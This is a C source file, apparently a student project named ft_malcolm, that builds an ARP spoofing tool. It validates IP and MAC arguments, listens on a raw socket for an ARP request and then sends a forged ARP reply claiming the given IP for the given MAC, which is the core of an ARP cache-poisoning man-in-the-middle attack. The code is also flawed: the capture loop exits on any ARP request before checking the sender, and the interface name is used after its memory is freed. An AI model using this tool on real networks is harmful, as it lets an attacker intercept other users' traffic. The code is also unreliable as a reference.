#include "ft_malcolm.h"

void handle_error(const char *msg) {
    perror(msg);
    exit(EXIT_FAILURE);
}

int validate_ip(const char *ip) {
    struct sockaddr_in sa;
    return inet_pton(AF_INET, ip, &(sa.sin_addr));
}

int validate_mac(const char *mac) {
    int i = 0, s = 0;
    while (*mac) {
        if (isxdigit(*mac)) {
            i++;
        } else if (*mac == ':' && (i == 2 || i == 5 || i == 8 || i == 11 || i == 14)) {
            i++;
            s++;
        } else {
            return 0;
        }
        mac++;
    }
    return (i == 17 && s == 5);
}

void capture_arp_packets(int sockfd, char *target_ip, char *target_mac) {
    unsigned char buffer[ETH_FRAME_LEN];
    struct sockaddr_ll sa;
    socklen_t sa_len = sizeof(sa);

    while (1) 
    { 
        int len = recvfrom(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr *)&sa, &sa_len);
        if (len < 0)
        {
            perror("recvfrom");
            continue;
        }

        struct ether_header *eth_header = (struct ether_header *)buffer;
        if (ntohs(eth_header->ether_type) != ETHERTYPE_ARP)
            continue;
        
        struct ether_arp *arp_pkt = (struct ether_arp *)(buffer + sizeof(struct ether_header));
        if (ntohs(arp_pkt->ea_hdr.ar_op) == ARPOP_REQUEST) {
            break;
        }

        char sender_ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, arp_pkt->arp_spa, sender_ip, sizeof(sender_ip));

        char target_ip_in_packet[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, arp_pkt->arp_tpa, target_ip_in_packet, sizeof(target_ip_in_packet));

        if(strcmp(target_ip, sender_ip) == 0){
            printf("Detected ARP request from target %s (%s)\n", target_ip, target_mac);
            
        }
    }
}

void send_arp_reply(int sockfd, const char *src_ip, const char *src_mac, const char *target_ip, const char *target_mac, const char *iface_name) {
    struct arp_packet packet;
    struct sockaddr_ll sa;
    int ifindex;

    ifindex = if_nametoindex(iface_name);
    if (ifindex == 0){
        perror("if_nametoindex");
        return;
    }

    memset(&sa, 0, sizeof(sa));
    sa.sll_family = AF_PACKET;
    sa.sll_ifindex = ifindex;
    sa.sll_halen = ETH_ALEN;

    unsigned char src_mac_bytes[6], target_mac_bytes[6];\
    sscanf(src_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
            &src_mac_bytes[0], &src_mac_bytes[1], &src_mac_bytes[2],
            &src_mac_bytes[3], &src_mac_bytes[4], &src_mac_bytes[5]);

    sscanf(target_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
            &target_mac_bytes[0], &target_mac_bytes[1], &target_mac_bytes[2],
            &target_mac_bytes[3], &target_mac_bytes[4], &target_mac_bytes[5]);
    
    // fill ethernet header
    memcpy(packet.ether_header.ether_dhost, target_mac_bytes, ETH_ALEN);
    memcpy(packet.ether_header.ether_shost, src_mac_bytes, ETH_ALEN);
    packet.ether_header.ether_type = htons(ETHERTYPE_ARP);

    // fill arp packet
    packet.arp.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    packet.arp.ea_hdr.ar_pro = htons(ETHERTYPE_IP);
    packet.arp.ea_hdr.ar_hln = ETH_ALEN;
    packet.arp.ea_hdr.ar_pln = 4;
    packet.arp.ea_hdr.ar_op = htons(ARPOP_REPLY);

    // Fill MAC and IP source
    memcpy(packet.arp.arp_sha, src_mac_bytes, ETH_ALEN);
    inet_pton(AF_INET, src_ip, packet.arp.arp_spa);

    // Fill MAC and IP Target/destination
    memcpy(packet.arp.arp_tha, target_mac_bytes, ETH_ALEN);
    inet_pton(AF_INET, target_ip, packet.arp.arp_tpa);

    // send packet
    if (sendto(sockfd, &packet, sizeof(packet), 0, (struct sockaddr *)&sa, sizeof(sa)) < 0)
        perror("sendto");
}

char *find_interface() {
    struct ifaddrs *ifaddr, *ifa;
    char *interface = NULL;

    if (getifaddrs(&ifaddr) == -1) {
        handle_error("getifaddrs");
    }

    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL)
            continue;

        if (ifa->ifa_addr->sa_family == AF_PACKET) {
            if ((ifa->ifa_flags & IFF_UP) && (ifa->ifa_flags & IFF_RUNNING)){
                if (!(ifa->ifa_flags & IFF_LOOPBACK)){
                    interface = ifa->ifa_name;
                    break;
                }
            }
        }
    }

    freeifaddrs(ifaddr);
    return interface;
}

int main(int argc, char *argv[]) {
    char *interface = NULL;

    if (argc != 5) {
        fprintf(stderr, "Usage: %s <source IP> <source MAC> <target IP> <target MAC>\n", argv[0]);
        return EXIT_FAILURE;
    }

    if (!validate_ip(argv[1])) {
        fprintf(stderr, "Invalid source IP address: %s\n", argv[1]);
        return EXIT_FAILURE;
    }

    if (!validate_mac(argv[2])) {
        fprintf(stderr, "Invalid source MAC address: %s\n", argv[2]);
        return EXIT_FAILURE;
    }

    if (!validate_ip(argv[3])) {
        fprintf(stderr, "Invalid target IP address: %s\n", argv[3]);
        return EXIT_FAILURE;
    }

    if (!validate_mac(argv[4])) {
        fprintf(stderr, "Invalid target MAC address: %s\n", argv[4]);
        return EXIT_FAILURE;
    }

    interface = find_interface();

    if (!interface) {
        fprintf(stderr, "No interface found.\n");
        return EXIT_FAILURE;
    }

    int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sockfd == -1) {
        handle_error("socket");
    }


    printf("Valid interface found: %s\n", interface);

    printf("Capturing ARP packets...\n");
    capture_arp_packets(sockfd, argv[3], argv[4]);

    // Enviar resposta ARP depois de capturar a solicitação ARP
    send_arp_reply(sockfd, argv[1], argv[2], argv[3], argv[4], interface);

    close(sockfd);
    return EXIT_SUCCESS;
}